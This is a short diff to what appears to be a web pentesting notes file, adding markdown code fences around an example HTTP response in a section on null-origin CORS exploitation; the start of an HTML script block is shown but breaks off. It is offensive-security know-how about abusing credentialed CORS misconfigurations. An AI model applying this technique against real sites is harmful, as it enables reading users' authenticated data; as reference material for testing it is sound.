@@ -907,10 +907,11 @@ https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 ## Null Origin Exploitation
 
 -> Identify - Response 
-HTTP/1.1 200 OK  
+```HTTP/1.1 200 OK  
 ...  
 Access-Control-Allow-Origin: null  
 Access-Control-Allow-Credentials: true
+```
 ```
 <html><head>
 <script>
